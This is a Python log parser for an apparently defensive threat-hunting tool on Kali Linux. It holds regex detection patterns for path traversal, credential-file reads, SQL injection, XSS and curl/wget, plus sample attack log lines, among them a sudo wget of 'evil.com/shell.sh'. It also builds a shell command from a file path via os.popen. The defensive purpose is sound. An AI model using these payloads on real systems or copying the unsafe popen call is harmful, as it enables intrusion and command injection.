#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║   LOG PARSER - log_parser.py                        ║
║   Parses: auth.log, syslog, apache, SSH, fail2ban   ║
╚══════════════════════════════════════════════════════╝
Reads REAL system logs from your Kali Linux machine
and feeds events into the ThreatHunter engine.
"""

import re
import os
import sys
import time
import json
import threading
from pathlib import Path
from datetime import datetime
from typing import Generator, Optional

# Add parent dir to path
sys.path.insert(0, str(Path(__file__).parent.parent))
from core.threat_engine import ThreatHunter, Colors


# ─── Log format regexes ───────────────────────────────────────────────────────

PATTERNS = {
    # SSH authentication log patterns
    "ssh_failed": re.compile(
        r'(\w+\s+\d+\s+\d+:\d+:\d+).*sshd.*Failed (?:password|publickey) for (?:invalid user )?(\S+) from (\S+) port (\d+)'
    ),
    "ssh_success": re.compile(
        r'(\w+\s+\d+\s+\d+:\d+:\d+).*sshd.*Accepted (?:password|publickey) for (\S+) from (\S+) port (\d+)'
    ),
    "ssh_invalid_user": re.compile(
        r'(\w+\s+\d+\s+\d+:\d+:\d+).*sshd.*Invalid user (\S+) from (\S+)'
    ),
    "ssh_disconnect": re.compile(
        r'(\w+\s+\d+\s+\d+:\d+:\d+).*sshd.*Disconnected from (?:invalid user )?(\S+) (\S+) port (\d+)'
    ),
    
    # Sudo attempts
    "sudo_success": re.compile(
        r'(\w+\s+\d+\s+\d+:\d+:\d+).*sudo.*:\s+(\S+)\s*:\s+TTY=\S+\s*;\s*PWD=(\S+)\s*;\s*USER=(\S+)\s*;\s*COMMAND=(.*)'
    ),
    "sudo_fail": re.compile(
        r'(\w+\s+\d+\s+\d+:\d+:\d+).*sudo.*authentication failure.*user=(\S+)'
    ),
    
    # Apache/Nginx web server
    "web_request": re.compile(
        r'(\S+)\s+-\s+-\s+\[([^\]]+)\]\s+"(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+(\S+)\s+HTTP/[\d.]+"\s+(\d+)\s+(\d+)'
    ),
    "web_attack": re.compile(
        r'(\S+).*"(?:GET|POST).*(?:\.\.\/|etc\/passwd|union.*select|<script|exec\(|eval\(|cmd=|;ls|&&|`)'
    ),
    
    # Fail2ban
    "fail2ban_ban": re.compile(
        r'(\d{4}-\d{2}-\d{2}\s+\d+:\d+:\d+).*fail2ban.*Ban\s+(\S+)'
    ),
    "fail2ban_unban": re.compile(
        r'(\d{4}-\d{2}-\d{2}\s+\d+:\d+:\d+).*fail2ban.*Unban\s+(\S+)'
    ),
    
    # Wazuh alerts (OSSEC format)
    "wazuh_alert": re.compile(
        r'\*\* Alert.*Rule:\s+(\d+).*level\s+(\d+).*\n.*Src IP:\s+(\S+)'
    ),
    
    # Network connections (netstat style)
    "new_connection": re.compile(
        r'(\S+)\s+(\d+)\s+\d+\s+(\S+):(\d+)\s+(\S+):(\d+)\s+(ESTABLISHED|SYN_SENT)'
    ),
    
    # Process execution (audit.log)
    "process_exec": re.compile(
        r'type=EXECVE.*argc=(\d+).*a0="([^"]+)"(?:.*a1="([^"]+)")?(?:.*a2="([^"]+)")?'
    ),
    "audit_syscall": re.compile(
        r'type=SYSCALL.*pid=(\d+).*uid=(\d+).*comm="([^"]+)".*exe="([^"]+)"'
    ),
}

# Web paths that indicate attacks
MALICIOUS_WEB_PATTERNS = [
    r'\.\./',           # Path traversal
    r'etc/passwd',      # File read attempt
    r'etc/shadow',
    r'union.*select',   # SQL injection
    r'<script',         # XSS
    r'exec\s*\(',       # Code execution
    r'eval\s*\(',
    r'cmd=',            # Command injection
    r'system\s*\(',
    r'wget\s+',
    r'curl\s+',
    r'base64_decode',
    r'phpinfo\s*\(',
    r'/.git/',          # Git exposure
    r'wp-login\.php',   # WordPress brute force
    r'admin/config',
    r'phpmyadmin',
]

WEB_ATTACK_REGEX = re.compile('|'.join(MALICIOUS_WEB_PATTERNS), re.IGNORECASE)


class LogParser:
    """
    Parses real system logs and feeds events to ThreatHunter.
    Supports both file-based parsing and real-time tailing.
    """
    
    def __init__(self, hunter: ThreatHunter):
        self.hunter = hunter
        self.hostname = self._get_hostname()
        self.parsed_count = 0
        self.running = False
        
        # Log file locations on Kali Linux
        self.log_files = {
            "auth":     Path("/var/log/auth.log"),
            "syslog":   Path("/var/log/syslog"),
            "kern":     Path("/var/log/kern.log"),
            "fail2ban": Path("/var/log/fail2ban.log"),
            "apache":   Path("/var/log/apache2/access.log"),
            "nginx":    Path("/var/log/nginx/access.log"),
            "audit":    Path("/var/log/audit/audit.log"),
        }
    
    def _get_hostname(self) -> str:
        try:
            import socket
            return socket.gethostname()
        except:
            return "kali"
    
    def parse_line(self, line: str, log_type: str = "auth"):
        """Parse a single log line and trigger appropriate detection"""
        line = line.strip()
        if not line:
            return
        
        self.parsed_count += 1
        
        # ── SSH Failed Login ─────────────────────────────────────────────────
        m = PATTERNS["ssh_failed"].search(line)
        if m:
            username = m.group(2)
            src_ip = m.group(3)
            if src_ip and src_ip != "::1" and src_ip != "127.0.0.1":
                self.hunter.detect_brute_force(src_ip, username, False, "SSH")
            return
        
        # ── SSH Successful Login ─────────────────────────────────────────────
        m = PATTERNS["ssh_success"].search(line)
        if m:
            username = m.group(2)
            src_ip = m.group(3)
            if src_ip:
                self.hunter.detect_brute_force(src_ip, username, True, "SSH")
            return
        
        # ── SSH Invalid User ─────────────────────────────────────────────────
        m = PATTERNS["ssh_invalid_user"].search(line)
        if m:
            username = m.group(2)
            src_ip = m.group(3)
            if src_ip:
                self.hunter.detect_brute_force(src_ip, username, False, "SSH")
            return
        
        # ── Sudo Command Execution ───────────────────────────────────────────
        m = PATTERNS["sudo_success"].search(line)
        if m:
            username = m.group(2)
            cmd = m.group(5) if m.group(5) else ""
            # Use loopback as IP for local activity (track by username)
            self.hunter.detect_suspicious_command("127.0.0.1", username, f"sudo {cmd}", self.hostname)
            return
        
        # ── Web Server Requests ──────────────────────────────────────────────
        m = PATTERNS["web_request"].search(line)
        if m:
            src_ip = m.group(1)
            method = m.group(3)
            path = m.group(4)
            status = m.group(5)
            
            # Check for web attacks
            if WEB_ATTACK_REGEX.search(path):
                if src_ip not in ("127.0.0.1", "::1"):
                    attack_type = self._classify_web_attack(path)
                    profile = self.hunter._get_or_create_profile(src_ip)
                    profile.add_event("WEB_ATTACK", f"{method} {path[:100]} → {status}", "HIGH", "T1190")
                    self.hunter._raise_alert(
                        src_ip,
                        f"WEB_ATTACK_{attack_type}",
                        f"Web attack detected: {method} {path[:100]} (HTTP {status})",
                        "HIGH",
                        "T1190"  # Exploit Public-Facing Application
                    )
            
            # Detect scanning (many 404s)
            if status == "404":
                self.hunter.detect_port_scan(src_ip, self.hostname, 80, "HTTP")
            return
        
        # ── Fail2ban Ban ─────────────────────────────────────────────────────
        m = PATTERNS["fail2ban_ban"].search(line)
        if m:
            banned_ip = m.group(2)
            profile = self.hunter._get_or_create_profile(banned_ip)
            profile.add_event("FAIL2BAN_BAN", f"Fail2ban banned this IP", "HIGH", "T1110")
            print(f"{Colors.YELLOW}[i] Fail2ban ban observed for {banned_ip}{Colors.RESET}")
            return
        
        # ── Audit Log Execution ──────────────────────────────────────────────
        m = PATTERNS["process_exec"].search(line)
        if m:
            cmd_parts = [m.group(2)]
            if m.group(3):
                cmd_parts.append(m.group(3))
            if m.group(4):
                cmd_parts.append(m.group(4))
            full_cmd = " ".join(cmd_parts)
            # Local processes — use localhost, track commands
            self.hunter.detect_suspicious_command("127.0.0.1", "audit", full_cmd, self.hostname)
            return
    
    def _classify_web_attack(self, path: str) -> str:
        """Classify type of web attack"""
        path_lower = path.lower()
        if "../" in path or "..%2f" in path_lower:
            return "PATH_TRAVERSAL"
        if any(x in path_lower for x in ["union", "select", "insert", "drop", "or 1=1"]):
            return "SQL_INJECTION"
        if any(x in path_lower for x in ["<script", "javascript:", "onerror="]):
            return "XSS"
        if any(x in path_lower for x in ["exec(", "system(", "cmd=", "shell"]):
            return "COMMAND_INJECTION"
        if any(x in path_lower for x in ["etc/passwd", "etc/shadow", "/proc/"]):
            return "FILE_READ"
        return "EXPLOIT_ATTEMPT"
    
    def parse_file(self, filepath: Path, log_type: str = "auth", tail_n: int = 1000):
        """Parse a log file (last N lines or full file)"""
        if not filepath.exists():
            print(f"{Colors.DIM}[~] Log file not found: {filepath}{Colors.RESET}")
            return 0
        
        print(f"{Colors.GREEN}[+] Parsing: {filepath}{Colors.RESET}")
        
        try:
            # Try to get last N lines efficiently
            result = os.popen(f"tail -n {tail_n} '{filepath}' 2>/dev/null").read()
            lines = result.splitlines()
        except Exception:
            try:
                with open(filepath, 'r', errors='replace') as f:
                    lines = f.readlines()[-tail_n:]
            except PermissionError:
                print(f"{Colors.YELLOW}[!] Permission denied: {filepath} (try sudo){Colors.RESET}")
                return 0
        
        count = 0
        for line in lines:
            self.parse_line(line, log_type)
            count += 1
        
        print(f"{Colors.DIM}    Parsed {count} lines{Colors.RESET}")
        return count
    
    def tail_file(self, filepath: Path, log_type: str, stop_event: threading.Event):
        """
        Real-time log tailing — watches a file for new lines.
        Like 'tail -f' but feeds directly into the detection engine.
        """
        if not filepath.exists():
            return
        
        print(f"{Colors.CYAN}[+] Live monitoring: {filepath}{Colors.RESET}")
        
        try:
            with open(filepath, 'r', errors='replace') as f:
                # Seek to end of file
                f.seek(0, 2)
                
                while not stop_event.is_set():
                    line = f.readline()
                    if line:
                        self.parse_line(line, log_type)
                    else:
                        time.sleep(0.1)
        except PermissionError:
            print(f"{Colors.YELLOW}[!] Permission denied for live monitoring: {filepath}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error tailing {filepath}: {e}{Colors.RESET}")
    
    def start_live_monitoring(self) -> threading.Event:
        """Start monitoring all available log files in real-time"""
        stop_event = threading.Event()
        threads = []
        
        print(f"\n{Colors.GREEN}[+] Starting live log monitoring...{Colors.RESET}")
        
        for log_type, filepath in self.log_files.items():
            if filepath.exists():
                t = threading.Thread(
                    target=self.tail_file,
                    args=(filepath, log_type, stop_event),
                    daemon=True,
                    name=f"tail-{log_type}"
                )
                t.start()
                threads.append(t)
        
        if not threads:
            print(f"{Colors.YELLOW}[!] No log files found (try running with sudo){Colors.RESET}")
        else:
            print(f"{Colors.GREEN}[+] Monitoring {len(threads)} log files{Colors.RESET}")
        
        return stop_event
    
    def parse_all_logs(self):
        """Parse all available log files (historical analysis)"""
        print(f"\n{Colors.CYAN}[*] Running historical log analysis...{Colors.RESET}\n")
        
        total = 0
        for log_type, filepath in self.log_files.items():
            count = self.parse_file(filepath, log_type, tail_n=5000)
            total += count
        
        print(f"\n{Colors.GREEN}[+] Total lines parsed: {total}{Colors.RESET}")
        return total
    
    def parse_custom_log(self, filepath: str, log_type: str = "auth"):
        """Parse a custom log file provided by the user"""
        path = Path(filepath)
        return self.parse_file(path, log_type, tail_n=99999)
    
    def generate_sample_attack_logs(self) -> list:
        """
        Generate realistic sample attack log lines for demonstration.
        Use this if you don't have real attacks to analyze.
        """
        now = datetime.now()
        timestamp = now.strftime("%b %d %H:%M:%S")
        
        sample_logs = [
            # Brute force SSH
            f"{timestamp} kali sshd[1234]: Failed password for root from 45.33.32.156 port 54321 ssh2",
            f"{timestamp} kali sshd[1234]: Failed password for root from 45.33.32.156 port 54322 ssh2",
            f"{timestamp} kali sshd[1234]: Failed password for admin from 45.33.32.156 port 54323 ssh2",
            f"{timestamp} kali sshd[1234]: Invalid user oracle from 45.33.32.156 port 54324",
            f"{timestamp} kali sshd[1234]: Failed password for oracle from 45.33.32.156 port 54324 ssh2",
            f"{timestamp} kali sshd[1234]: Failed password for postgres from 45.33.32.156 port 54325 ssh2",
            f"{timestamp} kali sshd[1234]: Accepted password for ubuntu from 45.33.32.156 port 54326 ssh2",
            
            # Sudo abuse after compromise
            f"{timestamp} kali sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash",
            f"{timestamp} kali sudo: ubuntu : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/shell.sh",
            
            # Web attacks
            f'45.33.32.156 - - [{now.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "GET /../../etc/passwd HTTP/1.1" 200 1337',
            f'45.33.32.156 - - [{now.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "POST /login?id=1 OR 1=1-- HTTP/1.1" 200 512',
            f'192.168.1.100 - - [{now.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "GET /wp-login.php HTTP/1.1" 200 4096',
            f'192.168.1.100 - - [{now.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "GET /phpmyadmin/setup.php HTTP/1.1" 404 0',
        ]
        
        return sample_logs
